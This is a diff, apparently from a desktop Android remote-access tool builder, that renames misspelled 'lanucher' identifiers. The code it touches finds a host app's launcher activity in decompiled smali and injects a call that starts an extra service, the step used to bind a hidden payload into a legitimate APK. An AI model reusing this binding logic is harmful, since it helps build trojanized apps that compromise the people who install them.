@@ -244,9 +244,9 @@ app.controller("AppCtrl", ($scope) => {
                 return;
             }
 
-            var lanucherPath = GetLanucherPath(data, path.join(apkFolder, "smali/"));
-            if (lanucherPath == -1) {
-                $appCtrl.Log("Cannot find the lanucher activity , try the other binding method.", CONSTANTS.logStatus.FAIL);
+            var launcherPath = GetLauncherPath(data, path.join(apkFolder, "smali/"));
+            if (launcherPath == -1) {
+                $appCtrl.Log("Cannot find the launcher activity , try the other binding method.", CONSTANTS.logStatus.FAIL);
                 return;
             }
 
@@ -260,23 +260,23 @@ app.controller("AppCtrl", ($scope) => {
                     return;
                 }
 
-                $appCtrl.Log("Fetching lanucher activity...");
-                fs.readFile(lanucherPath, 'utf8', (error, data) => {
+                $appCtrl.Log("Fetching launcher activity...");
+                fs.readFile(launcherPath, 'utf8', (error, data) => {
                     if (error) {
                         $appCtrl.Log('Reading launcher activity Failed ', CONSTANTS.logStatus.FAIL);
                         return;
                     }
 
 
-                    var startService = CONSTANTS.serviceSrc + lanucherPath.substring(lanucherPath.indexOf("smali/") + 6, lanucherPath.indexOf(".smali")) + CONSTANTS.serviceStart;
+                    var startService = CONSTANTS.serviceSrc + launcherPath.substring(launcherPath.indexOf("smali/") + 6, launcherPath.indexOf(".smali")) + CONSTANTS.serviceStart;
 
 
                     var key = CONSTANTS.orgAppKey;
-                    $appCtrl.Log("Modifiying lanucher activity...");
+                    $appCtrl.Log("Modifiying launcher activity...");
                     var output = data.substring(0, data.indexOf(key) + key.length) + startService + data.substring(data.indexOf(key) + key.length);
-                    fs.writeFile(lanucherPath, output, 'utf8', (error) => {
+                    fs.writeFile(launcherPath, output, 'utf8', (error) => {
                         if (error) {
-                            $appCtrl.Log('Modifying lanucher activity Failed', logStatus.FAIL);
+                            $appCtrl.Log('Modifying launcher activity Failed', logStatus.FAIL);
                             return;
                         }
 
@@ -375,8 +375,8 @@ app.controller("AppCtrl", ($scope) => {
 
 
 
-//function to extract the luncher activity from the orginal app
-function GetLanucherPath(manifest, smaliPath) {
+//function to extract the launcher activity from the orginal app
+function GetLauncherPath(manifest, smaliPath) {
 
 
     var regex = /<activity/gi,
